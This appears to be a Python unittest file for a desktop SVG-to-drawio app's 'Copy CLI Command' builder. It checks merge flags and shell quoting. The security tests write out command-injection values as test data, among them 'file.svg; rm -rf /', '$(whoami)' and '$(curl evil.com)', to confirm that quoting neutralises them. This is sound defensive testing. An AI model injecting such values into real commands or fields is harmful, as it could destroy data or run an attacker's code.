"""Tests for the desktop app's "Copy CLI Command" builder (no Qt dependency)."""

from __future__ import annotations

import unittest

from svg_to_drawio.rendering_options import RenderingOptions
from svg_to_drawio_desktop.cli_command import CliCommandOptions, build_equivalent_cli_command, quote_cli_arg


def _base_options(**overrides: object) -> CliCommandOptions:
    defaults: dict[str, object] = dict(
        sources=("diagram.svg",),
        output_dir=None,
        recursive=False,
        overwrite=False,
        flatten=False,
        watch=False,
        use_cache=True,
        max_elements=None,
        workers=1,
        preset="balanced",
        rendering_options=RenderingOptions(),
    )
    defaults.update(overrides)
    return CliCommandOptions(**defaults)  # type: ignore[arg-type]


class CliCommandMergeTests(unittest.TestCase):
    """The copied command must reflect the merge/post-process fields when they are set."""

    def test_no_merge_or_post_process_omits_the_new_flags(self) -> None:
        command = build_equivalent_cli_command(_base_options())
        for flag in ("--merge", "--merge-output", "--grid-columns", "--legend", "--background-color"):
            self.assertNotIn(flag, command)

    def test_merge_pages_includes_mode_and_output(self) -> None:
        command = build_equivalent_cli_command(_base_options(merge="pages", merge_output="out/merged.drawio"))
        self.assertIn("--merge pages", command)
        self.assertIn("--merge-output 'out/merged.drawio'", command)
        self.assertNotIn("--grid-columns", command)

    def test_merge_grid_includes_columns_when_set(self) -> None:
        command = build_equivalent_cli_command(
            _base_options(merge="grid", merge_output="out/merged.drawio", grid_columns=3)
        )
        self.assertIn("--merge grid", command)
        self.assertIn("--grid-columns 3", command)

    def test_legend_and_background_are_appended(self) -> None:
        command = build_equivalent_cli_command(_base_options(legend=True, background_color="#FFFFFF"))
        self.assertIn("--legend", command)
        self.assertIn("--background-color '#FFFFFF'", command)


class CliCommandSecurityTests(unittest.TestCase):
    """The copied command must properly escape shell metacharacters to prevent command injection."""

    def test_command_substitution_with_dollar_parens_is_escaped(self) -> None:
        """Verify that $(command) syntax is properly escaped and won't execute."""
        malicious_path = "$(touch /tmp/marker)"
        quoted = quote_cli_arg(malicious_path)
        # shlex.quote should escape this so it's treated as a literal string
        self.assertNotIn("$(touch", quoted)  # The $() should be escaped/quoted
        # Verify it's safe by checking the command doesn't contain unquoted command substitution
        command = build_equivalent_cli_command(_base_options(sources=(malicious_path,)))
        # The command should contain the escaped version, not raw $(touch /tmp/marker)
        self.assertIn("'$(touch /tmp/marker)'", command)

    def test_backtick_command_substitution_is_escaped(self) -> None:
        """Verify that backtick command substitution is properly escaped."""
        malicious_path = "`touch /tmp/marker`"
        quoted = quote_cli_arg(malicious_path)
        # Should be safely quoted
        self.assertIn("'`touch /tmp/marker`'", quoted)
        
    def test_variable_expansion_is_escaped(self) -> None:
        """Verify that $VAR variable expansion is properly escaped."""
        malicious_path = "$HOME/evil"
        quoted = quote_cli_arg(malicious_path)
        # Should be safely quoted to prevent expansion
        self.assertIn("'$HOME/evil'", quoted)

    def test_backslash_escapes_are_neutralized(self) -> None:
        """Verify that backslash escape sequences are treated literally."""
        path_with_backslash = "path\\nwith\\tescapes"
        quoted = quote_cli_arg(path_with_backslash)
        # Should preserve backslashes literally
        self.assertIn(path_with_backslash, quoted)

    def test_semicolon_command_chaining_is_escaped(self) -> None:
        """Verify that semicolon command chaining is properly escaped."""
        malicious_path = "file.svg; rm -rf /"
        quoted = quote_cli_arg(malicious_path)
        # Should be safely quoted
        self.assertIn("';'", quoted)

    def test_pipe_command_is_escaped(self) -> None:
        """Verify that pipe operators are properly escaped."""
        malicious_path = "file.svg | cat"
        quoted = quote_cli_arg(malicious_path)
        # Should be safely quoted
        self.assertIn("'|'", quoted)

    def test_output_dir_with_command_substitution_is_escaped(self) -> None:
        """Verify that malicious output_dir is properly escaped."""
        malicious_dir = "$(whoami)"
        command = build_equivalent_cli_command(_base_options(output_dir=malicious_dir))
        # Should contain safely quoted version
        self.assertIn("'$(whoami)'", command)

    def test_merge_output_with_command_substitution_is_escaped(self) -> None:
        """Verify that malicious merge_output is properly escaped."""
        malicious_output = "$(id).drawio"
        command = build_equivalent_cli_command(
            _base_options(merge="pages", merge_output=malicious_output)
        )
        # Should contain safely quoted version
        self.assertIn("'$(id).drawio'", command)

    def test_background_color_with_command_substitution_is_escaped(self) -> None:
        """Verify that malicious background_color is properly escaped."""
        malicious_color = "$(curl evil.com)"
        command = build_equivalent_cli_command(_base_options(background_color=malicious_color))
        # Should contain safely quoted version
        self.assertIn("'$(curl evil.com)'", command)

    def test_simple_paths_remain_readable(self) -> None:
        """Verify that simple paths without special characters remain readable."""
        simple_path = "diagram.svg"
        quoted = quote_cli_arg(simple_path)
        # Simple paths should remain unquoted or minimally quoted
        self.assertIn("diagram.svg", quoted)

    def test_paths_with_spaces_are_properly_quoted(self) -> None:
        """Verify that paths with spaces are properly quoted."""
        path_with_spaces = "my diagram.svg"
        quoted = quote_cli_arg(path_with_spaces)
        # Should be quoted to handle spaces
        self.assertIn("'my diagram.svg'", quoted)
